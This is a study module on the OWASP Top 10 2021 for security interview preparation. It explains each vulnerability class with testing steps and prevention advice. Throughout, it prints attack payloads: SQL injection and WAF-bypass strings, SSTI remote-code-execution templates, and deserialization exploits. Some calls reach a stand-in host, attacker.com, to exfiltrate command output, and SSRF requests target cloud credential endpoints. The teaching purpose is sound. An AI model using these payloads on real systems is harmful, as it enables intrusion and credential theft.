# OWASP Top 10

!!! info "Why This Matters"
    The OWASP Top 10 is the single most tested topic in web application security interviews at all levels. Juniors are expected to name and explain all 10. Mid-level candidates must demonstrate exploitation mechanics. Seniors must discuss bypass techniques, business impact, and defense depth. This module goes deep on all 10.

!!! info "Current Version"
    This covers the **OWASP Top 10 2021** — the version currently in use. Always verify the version in use at your target organization, as some still reference the 2017 edition.

---

## A01:2021 — Broken Access Control

**Previously:** Moved up from #5 in 2017 to #1 in 2021 — the most prevalent vulnerability in web applications.

### What It Is

Access control enforces restrictions on what authenticated users can do. Broken access control means these restrictions are missing, improperly implemented, or bypassable. An attacker can act outside their intended permissions.

### Categories of Broken Access Control

**Insecure Direct Object Reference (IDOR):**
The application uses a user-supplied value (ID, filename, etc.) to directly reference an object without verifying the requesting user is authorized to access that object.

```
GET /api/v1/invoices/10042 HTTP/1.1
Authorization: Bearer eyJhbGc...   (user A's token)

Response: Invoice data for user B
```

The server authenticates the request (valid token) but doesn't check if the token's user owns invoice 10042. User A can access any invoice by incrementing the ID.

**IDOR variants:**
- Numeric IDs: `/profile?id=1337` → try 1338, 1339...
- Predictable references: `/files/2024/01/report.pdf` → try other dates, usernames
- GUIDs/UUIDs: Less guessable but still exploitable if another endpoint leaks them
- Indirect reference: modify parameters that look like display names but actually map to database references

**Vertical Privilege Escalation:**
A lower-privileged user accesses higher-privileged functionality. User can reach `/admin/` endpoints, or a regular user can delete any user's account.

```
GET /admin/users HTTP/1.1
Authorization: Bearer <regular_user_token>

Response: 200 OK with user list
# Should be 403 Forbidden
```

**Horizontal Privilege Escalation:**
User can access another user's data at the same privilege level. (IDOR is the classic example.)

**Forced Browsing:**
Accessing pages/endpoints that the application doesn't link to from the UI but doesn't protect server-side. The UI hides the link, but the server doesn't enforce access control.

**HTTP Method Bypass:**
An endpoint is protected for PUT/DELETE but not for GET or POST:
```
DELETE /api/user/42 → 403 Forbidden
GET /api/user/42/delete → 200 OK
```

**Path Traversal:**
Accessing files outside the intended directory:
```
GET /download?file=../../etc/passwd
GET /download?file=..%2F..%2Fetc%2Fpasswd  (URL encoded)
GET /download?file=....//....//etc/passwd   (filter bypass)
```

**JWT Algorithm Confusion:** See A07 for JWT attacks.

**CORS Misconfiguration:** Covered separately below.

### How to Test for BAC

1. Map all functionality available to your user level
2. For every request, check: can a lower-privileged user make this same request?
3. For every object reference (IDs, filenames), try accessing another user's object
4. Test every endpoint with: no authorization header, a lower-privilege token, a token belonging to a different user (same level)
5. Try HTTP method switching on restricted endpoints
6. Check for path traversal in any parameter that references files
7. Map admin functionality and test from a regular user context

### Prevention

- Deny by default — except for public resources
- Implement access control in the server-side — never client-side
- Re-validate permissions on every request, not just at login
- Use indirect object references (random tokens, not sequential IDs) where possible
- Log access control failures and alert on patterns

---

## A02:2021 — Cryptographic Failures

**Previously:** Called "Sensitive Data Exposure" in 2017. Renamed to focus on the root cause: cryptographic failures enable data exposure.

### What It Is

Failures in cryptography that expose sensitive data — failure to encrypt, use of weak algorithms, poor key management, or exposing keys alongside data.

### Common Cryptographic Failures

**Data transmitted in cleartext:**
- HTTP instead of HTTPS for login forms or sensitive pages
- FTP, Telnet, SMTP without TLS
- API endpoints that accept HTTP (even if the site has HTTPS, developers sometimes create HTTP endpoints for "internal" APIs)

**Weak or outdated encryption:**
- MD5 or SHA-1 for password hashing (no salt, too fast)
- DES, 3DES, RC4 for data encryption
- RSA keys < 2048 bits
- SSLv2, SSLv3, TLS 1.0, TLS 1.1 — deprecated, vulnerable
- Weak cipher suites (NULL cipher, EXPORT ciphers, DES, RC4, SEED)
- ECB block cipher mode (leaks patterns)

**Hardcoded cryptographic keys:**
- Encryption keys in source code
- Same key across all installations of software
- Keys stored alongside encrypted data (defeating the purpose)

**Poor key management:**
- Long-lived API keys with no rotation
- Encryption keys stored in version control
- Encryption keys with overly broad access (same key for dev and production)

**Missing HTTPS enforcement:**
- No HSTS header (allows SSL stripping)
- HSTS without `includeSubDomains` (subdomain can be HTTP, which sets cookies for the main domain)
- HTTP login forms (even if form submits to HTTPS)
- Mixed content (HTTPS page loads HTTP resources)

**Cookie Secure flag missing:**
```
Set-Cookie: session=abc123
# vs.
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
```
Without `Secure`, the session cookie is sent over HTTP — capturable on the network.

### How to Test

```bash
# TLS testing
testssl.sh https://target.com            # Comprehensive TLS analysis
sslscan target.com
sslyze target.com

# Check for HTTP to HTTPS redirect
curl -I http://target.com                # Should redirect to HTTPS
curl -I -L http://target.com            # Follow redirects

# Check HSTS
curl -I https://target.com | grep -i strict-transport

# Check cookie attributes
curl -I https://target.com | grep -i set-cookie

# Check cipher suites
nmap --script ssl-enum-ciphers -p 443 target.com
```

For code review:
```python
# Red flags in Python
import hashlib
hashlib.md5(password)              # Weak, no salt
hashlib.sha256(password.encode())  # Still no salt, too fast

# Should be:
import bcrypt
bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

---

## A03:2021 — Injection

**Previously:** #1 in 2017. Now #3, but SQL injection remains one of the most critical findings when found.

### SQL Injection

SQL injection occurs when user-supplied input is incorporated into a SQL query without proper parameterization. The input can break out of the data context and into the SQL command context.

**Classic example:**
```sql
-- Application query
SELECT * FROM users WHERE username='$username' AND password='$password'

-- Attacker input: username = admin'--
-- Resulting query:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Everything after -- is a comment. Password check bypassed.
```

**Error-based SQLi:** The error message from the database reveals structural information:
```
' → error: "You have an error in your SQL syntax..."
'' → no error → injectable
```

**UNION-based SQLi:** Append a UNION query to extract data from other tables:
```sql
-- Original: SELECT id,name,email FROM users WHERE id=1
-- Injected: id=1 UNION SELECT username,password,3 FROM admin_users--
-- Returns data from admin_users table in the same response
```

Requirements: same number of columns, compatible data types. Use NULL for unknown types.

**Blind SQLi (Boolean-based):** No error output, no data returned — only True/False behavior:
```
?id=1 AND 1=1   → page loads normally (true)
?id=1 AND 1=2   → page loads differently (false)

# Extract data one bit at a time:
?id=1 AND SUBSTRING(username,1,1)='a'   → true/false
?id=1 AND ASCII(SUBSTRING(username,1,1))>97  → binary search
```

**Blind SQLi (Time-based):** No response difference visible — use time delays:
```sql
-- MySQL
?id=1 AND SLEEP(5)--          # Delays 5 seconds if injectable

-- MSSQL
?id=1; WAITFOR DELAY '0:0:5'-- # Delays 5 seconds

-- Oracle
?id=1 AND 1=1 UNION SELECT 1,DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL--

-- PostgreSQL
?id=1; SELECT pg_sleep(5)--
```

**Out-of-band SQLi:** Exfiltrate via DNS or HTTP:
```sql
-- MSSQL
?id=1; EXEC master..xp_dirtree '//attacker.com/data'--

-- MySQL
?id=1 AND LOAD_FILE('/etc/passwd') INTO OUTFILE '/var/www/html/shell.php'--
```

**sqlmap — automation:**
```bash
# Basic test
sqlmap -u "http://target.com/page.php?id=1"

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With cookies (authenticated)
sqlmap -u "http://target.com/profile.php?id=1" --cookie="session=abc123"

# Specific database
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# Dump data
sqlmap -u "http://target.com/page.php?id=1" --dbs        # List databases
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump

# OS shell (if xp_cmdshell available or FILE privilege)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Bypass WAF with tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase
```

### Command Injection

User input is passed to an OS command. The injected commands run with the web server's privileges.

**Injection operators:**
```bash
# Command chaining
; ls         # Run ls regardless
&& ls        # Run ls only if previous succeeded
|| ls        # Run ls only if previous failed
| ls         # Pipe: output of previous becomes input to ls

# Command substitution
`whoami`      # Backtick execution
$(whoami)     # Dollar-paren execution

# Blind command injection via time delay
; sleep 5    # 5-second delay confirms injection

# Blind via DNS exfiltration
; nslookup $(whoami).attacker.com   # Username in DNS query
```

**Testing:**
```
# In any parameter that might call system commands
ping_target=127.0.0.1; whoami
filename=test.pdf|ls
```

### LDAP Injection

User input incorporated into LDAP queries. Similar to SQLi but for directory services.

```
# Login bypass: username=*)(&(objectClass=user)(
# Resulting LDAP filter: (&(uid=*)(objectClass=user))(uid=anything))
# Matches all users
```

### XPath Injection

Similar to SQLi but for XML databases queried with XPath:
```
# Original: /users/user[username/text()='$user' and password/text()='$pass']
# Injected username: admin' or '1'='1
# Result: matches all users
```

### SSTI — Server-Side Template Injection

Template engines (Jinja2, Twig, Freemarker, Smarty) process templates with variables. If user input is rendered as a template rather than data, it executes in the template engine context.

```python
# Jinja2 (Python) detection
{{7*7}} → 49 in response (confirms SSTI, not just output)
{{7*'7'}} → 7777777 (Jinja2 specific)

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.mro()[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Twig (PHP)
{{7*7}} → 49
{{system('id')}}

# Freemarker (Java)
${7*7} → 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Detection strategy:** Try `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` in all user-controlled input. Arithmetic result in response = SSTI.

---

## A04:2021 — Insecure Design

**New in 2021.** Distinct from implementation flaws — insecure design means the architecture and design decisions themselves are insecure, not just the code.

### What It Is

Design flaws that cannot be patched because the fundamental approach is wrong. The fix requires redesign, not a code change.

**Business logic vulnerabilities:**
- Coupon codes that can be applied multiple times
- Price manipulation (negative quantities, replacing price in request)
- Race conditions in transfer/purchase flows
- Step-skipping in multi-step workflows (add to cart → payment → skip payment → order confirmation)

**Missing security controls by design:**
- No rate limiting on authentication endpoints (by design, not oversight)
- No email verification for account creation
- Password reset that relies only on security questions (easily guessable)
- "Remember me" that never expires

**Example — Price Manipulation:**
```
POST /checkout HTTP/1.1
{"item_id": 42, "quantity": 1, "unit_price": 999.99}

# Change unit_price in the request:
{"item_id": 42, "quantity": 1, "unit_price": 0.01}

# If the server trusts the client-supplied price: checkout at $0.01
```

**Example — Negative Quantity:**
```
{"item_id": 42, "quantity": -1}
# Negative quantity reduces cart total — can result in refund or free items
```

**Example — Workflow Bypass:**
Multi-step checkout — steps: add items → enter shipping → payment → confirmation. If the server doesn't verify previous steps were completed:
```
POST /checkout/confirmation  # Skip directly to step 4
# Order confirmed with no payment
```

### How to Test

Business logic testing requires understanding the application's intended behavior, then testing violations:
- All numeric inputs: negative, zero, max values, decimal values
- Price/quantity parameters: never trust client-supplied values
- Multi-step flows: skip steps, replay steps, return to previous steps
- Discount/coupon codes: apply multiple times, apply after already applied
- Time-limited offers: manipulate timestamps if visible
- Concurrent requests: send multiple simultaneous requests for operations that should only execute once (race conditions — covered at Level 2)

---

## A05:2021 — Security Misconfiguration

Misconfiguration is the most commonly found issue in practice. It encompasses a wide range of issues from default credentials to unnecessary features enabled.

### Common Misconfigurations

**Default credentials:**
```
admin/admin, admin/password, admin/1234
root/root, root/toor
tomcat/tomcat (Tomcat Manager)
admin/admin123 (various network devices)
sa/ (empty password — SQL Server SA account)
```

**Directory listing enabled:**
```
http://target.com/uploads/   → lists all uploaded files
http://target.com/backup/    → lists backup files
```

**Verbose error messages:**
- Stack traces revealing framework, versions, internal paths
- Database error messages revealing query structure (enables SQLi)
- "Debug mode" enabled in production

**Unnecessary features/services enabled:**
- Tomcat Manager accessible externally
- phpMyAdmin accessible without IP restriction
- Jenkins/GitLab/Jira without authentication
- AWS S3 buckets with public read/write
- Redis without authentication (default)
- Elasticsearch without authentication (default before v8)
- MongoDB without authentication (older defaults)

**Missing security headers:**
```http
# Should be present:
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY                     # Clickjacking prevention
X-Content-Type-Options: nosniff           # MIME sniffing prevention
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=()        # Feature policy
```

**Cloud misconfigurations:**
- S3 bucket public read: `aws s3 ls s3://target-bucket`
- Open security groups (0.0.0.0/0 inbound on port 22, 3389)
- Instance metadata service accessible (SSRF → cloud creds)
- No MFA on cloud console root account

### How to Test

```bash
# Security headers
curl -I https://target.com
curl -sI https://target.com | grep -iE "(x-frame|x-content|x-xss|content-security|hsts|referrer)"

# nikto — web server misconfiguration scanner
nikto -h http://target.com

# nuclei — template-based vulnerability scanner (fast, comprehensive)
nuclei -u https://target.com -t exposures/ -t misconfiguration/

# Check default credentials
hydra -l admin -P /usr/share/wordlists/common_passwords.txt http-post-form target.com

# Check directory listing
gobuster dir -u http://target.com -w /wordlists/common.txt
```

---

## A06:2021 — Vulnerable and Outdated Components

Using libraries, frameworks, or other software components with known vulnerabilities.

### What It Is

Log4Shell (CVE-2021-44228) is the canonical example: a single vulnerable dependency (Apache Log4j) led to critical RCE across millions of applications worldwide because Java applications included Log4j as a transitive dependency, often without knowing it.

### Discovery Methods

**Web fingerprinting:**
```bash
whatweb http://target.com -v         # Identify CMS, framework versions
wappalyzer                            # Browser extension
```

**Check response headers:**
- `X-Powered-By: PHP/5.6.40` → PHP 5.6 is end-of-life since 2018
- `Server: Apache/2.2.34` → Apache 2.2 is EOL
- `X-Generator: Drupal 7` → Check CVEs for Drupal 7

**JavaScript libraries:**
```bash
# Retire.js — identifies known vulnerable JS libraries
retire --path /var/www/html
retire --js --jspath /path/to/js/files
```

**Check package files (source code review):**
```
package.json / package-lock.json (Node.js)
requirements.txt / Pipfile.lock (Python)
pom.xml / build.gradle (Java/Maven/Gradle)
Gemfile.lock (Ruby)
composer.lock (PHP)
go.sum (Go)
```

**Automated SCA (Software Composition Analysis):**
```bash
# OWASP Dependency-Check
dependency-check.sh --project "App" --scan /path/to/app

# Snyk (free tier available)
snyk test

# npm audit (Node.js)
npm audit
```

### Exploitation

Known CVEs with public exploits — Metasploit modules, ExploitDB, PoC code on GitHub:
```bash
# Search for exploits
searchsploit apache 2.2
searchsploit struts2

# Metasploit
msfconsole
> search type:exploit name:drupal
> use exploit/multi/http/drupal_drupageddon2
```

---

## A07:2021 — Identification and Authentication Failures

**Previously:** "Broken Authentication" (2017). Expanded to include all identification failures.

### Password Attacks

**Credential stuffing:** Username/password pairs from previous breaches tried against the target:
```bash
# credential stuffing with hydra
hydra -C /path/to/breach_combo.txt http-post-form target.com/login
```

**Password spraying:** One password (or a few) tried against many users. Avoids lockout:
```bash
# Spray common passwords across user list
crackmapexec smb target -u users.txt -p 'Summer2024!'  # One password, many users
```

**Brute force:** All combinations tried — effective only when no lockout:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "target.com/login:user=^USER^&pass=^PASS^:Invalid"
```

### Broken Session Management

**Predictable session tokens:**
- Tokens that are sequential (`session=10001`, `10002`, `10003`)
- Tokens derived from username + timestamp
- Short token length (easy to brute force)

**Session fixation:**
Attacker sets a known session ID before authentication:
```
1. Attacker visits site, gets session ID: SESS=12345
2. Attacker sends victim: http://target.com?SESSID=12345
3. Victim authenticates — session SESS=12345 is now associated with victim's account
4. Attacker uses SESS=12345 — logged in as victim
```
Prevention: regenerate session ID on authentication.

**Session not invalidated on logout:**
```bash
# After logout, test if old session token still works
curl -H "Cookie: session=<old_token>" http://target.com/dashboard
# Should return 302 to login, not 200 with dashboard
```

### JWT Attacks

JWT (JSON Web Token) format: `base64(header).base64(payload).signature`

**None algorithm attack:**
Some libraries accept the `alg: none` value, skipping signature verification:
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
token = f"{header}.{payload}."   # No signature
```

**Algorithm confusion (RS256 → HS256):**
If the server uses RS256 (asymmetric — public+private key) but also accepts HS256 (symmetric — single secret), an attacker can:
1. Get the server's public key (often available at `/jwks.json` or in documentation)
2. Forge a token signed with HS256 using the public key as the HMAC secret

**Weak secret brute force:**
If HS256, the JWT signature is HMAC-SHA256 of `header.payload` using a secret. Weak secrets can be cracked:
```bash
hashcat -a 0 -m 16500 token.txt /wordlists/rockyou.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt token.txt
```

**Expired token acceptance:**
```python
# Check if server validates 'exp' claim
# Modify payload exp claim to a future timestamp, re-sign (if key known)
```

### Insecure Password Recovery

- Security questions with easily guessable answers
- Password reset link sent to email but doesn't expire
- Password reset token predictable (timestamp-based)
- Reset token sent in URL where it appears in logs and Referer headers
- No rate limiting on reset attempts (allows token brute force)

---

## A08:2021 — Software and Data Integrity Failures

**New category in 2021.** Covers deserialization vulnerabilities and supply chain attacks.

### Insecure Deserialization

Deserialization converts a byte stream back into a program object. If untrusted data is deserialized, an attacker can craft a malicious object that triggers code execution during the deserialization process.

**Java deserialization:**
```bash
# Identify serialized Java objects: bytes start with 0xACED0005
# or base64 encoded: "rO0AB..."

# ysoserial — generates deserialization payloads for Java gadget chains
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/?x=$(whoami)' > payload.ser

# Check if endpoint accepts serialized objects
curl -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target.com/api/endpoint
```

**PHP deserialization:**
```php
// PHP object with magic method
class Example {
    public $command;
    
    public function __destruct() {
        system($this->command);  // Called when object is destroyed
    }
}

// Serialized form
// O:7:"Example":1:{s:7:"command";s:2:"id";}
// Supply as cookie or parameter
```

**Python pickle deserialization:**
```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/?x=$(id)',))

pickle.dumps(Exploit())  # Generates payload
```

### Supply Chain Attacks

Malicious code introduced through dependencies, build systems, or update mechanisms:
- SolarWinds: Build pipeline compromised, malicious code in official updates
- npm typosquatting: `crossenv` instead of `cross-env`
- Dependency confusion: Private package names squatted in public repos

### Prevention

- Use digital signatures to verify software/updates
- Use package managers that verify integrity (npm lock files, pip hash checking)
- Monitor dependencies for unexpected changes

---

## A09:2021 — Security Logging and Monitoring Failures

**Previously:** "Insufficient Logging & Monitoring" (2017, #10). Security impact: attackers can operate undetected, and forensic investigation is impaired.

### What Should Be Logged

**Authentication events:**
- Successful logins: user, IP, timestamp, user-agent
- Failed logins: user, IP, timestamp, error type
- Logouts
- Password changes and resets
- MFA events (success, failure, bypass)

**Authorization events:**
- Access to sensitive resources
- Access control failures (403s) — especially repeated failures (brute force indicator)
- Privilege escalation events

**Input validation failures:**
- SQL injection attempts (error-based)
- XSS attempts
- Invalid input patterns

**Security control events:**
- WAF blocks
- IDS/IPS alerts

### What Makes Logging Useful

- Logs must be **centralized** (SIEM) — local logs can be deleted by attacker
- Logs must be **tamper-evident** — attacker who gains OS access will clear local logs
- Logs must have **sufficient detail** — "login failed" is useless without the username, IP, and timestamp
- **Alerting** must exist — logging without alerting means breaches go undetected
- **Retention** must be sufficient — many breaches are discovered months later; logs must cover the discovery window

### Pentesting Angle

This category is about what happens *after* exploitation — not a vulnerability you exploit directly. But in a red team or pentest context:
- Check if repeated failed logins trigger lockout or alerting
- Check if accessing unauthorized resources (IDOR) generates any visible response indicating detection
- Check if error messages you trigger end up in logs (and what detail they capture)
- During post-exploitation: examine logs to understand what was captured about your activities

---

## A10:2021 — Server-Side Request Forgery (SSRF)

**New in 2021** (previously unranked). Moved to A10 due to increasing frequency and critical impact in cloud environments.

### What It Is

SSRF causes the server to make HTTP requests to attacker-specified locations. The server becomes a proxy — requests originate from the server's IP and network context, bypassing firewalls, accessing internal services, and in cloud environments, reaching the metadata service for credentials.

### Finding SSRF

Any parameter that accepts a URL or hostname is a potential SSRF vector:
```
# URL parameters
?url=https://example.com/image.png
?webhook=https://attacker.com/
?pdf_source=https://target.com/report

# XML-based SSRF (XXE)
<!ENTITY xxe SYSTEM "http://attacker.com/">

# Image/document processing (server fetches the resource)
# File imports, webhooks, integrations

# Headers sometimes used as URLs
Referer: http://internal-server/admin
X-Forwarded-Host: internal-server
```

### SSRF Impact

**Internal network access:**
```
# Access internal services not directly exposed to attacker
?url=http://192.168.1.1/admin           # Router admin panel
?url=http://10.0.0.1:8080/manager      # Tomcat manager on internal host
?url=http://elasticsearch.internal:9200/_cat/indices
?url=http://redis.internal:6379         # Redis without auth
```

**Cloud metadata services:**
```
# AWS EC2 Instance Metadata Service (IMDS)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns temporary AWS credentials:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}
# Use these credentials with aws cli to access AWS resources

# Azure IMDS
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header required: Metadata: true

# GCP
?url=http://metadata.google.internal/computeMetadata/v1/
# Header required: Metadata-Flavor: Google
```

**File read via file:// scheme:**
```
?url=file:///etc/passwd
?url=file:///C:/Windows/win.ini
```

**Port scanning the internal network:**
```python
# Use SSRF to scan internal ports
for port in [22, 80, 443, 3306, 8080, 8443]:
    response = requests.get(f"http://target.com/fetch?url=http://192.168.1.100:{port}")
    # Analyze response time and content to determine open/closed
```

### SSRF Bypass Techniques

```
# IPv6 loopback
?url=http://[::1]/admin

# Decimal IP
?url=http://2130706433/  (127.0.0.1 in decimal)

# Hex IP
?url=http://0x7f000001/  (127.0.0.1 in hex)

# URL encoding
?url=http://%31%32%37%2e%30%2e%30%2e%31/

# DNS rebinding
# Domain that resolves to 127.0.0.1 after first check
# 127.0.0.1.nip.io resolves to 127.0.0.1

# Redirects
# Server follows redirect to internal URL
?url=http://attacker.com/redirect   # Returns 302 to http://169.254.169.254/...
```

### Prevention

- Whitelist allowed domains/IPs
- Validate and sanitize URLs before making requests
- Use network-level controls to prevent server from reaching internal services
- Disable unused URL schemes (file://, dict://, gopher://)
- In AWS: enforce IMDSv2 (requires session token, not accessible via simple GET)

---

## Summary Table

| ID | Name | Quick Test | Impact |
|----|------|-----------|--------|
| A01 | Broken Access Control | Change user IDs, test unauthorized endpoints | Data exposure, privilege escalation |
| A02 | Cryptographic Failures | testssl.sh, cookie inspection | Data breach, session theft |
| A03 | Injection | ' " ; in all inputs; SSTI templates | RCE, data extraction, auth bypass |
| A04 | Insecure Design | Business logic abuse, price manipulation | Financial fraud, data access |
| A05 | Security Misconfiguration | Default creds, headers, directory listing | Full system compromise |
| A06 | Vulnerable Components | Version fingerprinting, CVE lookup | Range: info disclosure to RCE |
| A07 | Auth Failures | JWT attacks, session fixation, brute force | Account takeover |
| A08 | Integrity Failures | Deserialization gadget chains | RCE, supply chain compromise |
| A09 | Logging Failures | Check if attacks generate alerts | Attacker operates undetected |
| A10 | SSRF | URL parameters, webhook fields | Internal access, cloud creds |
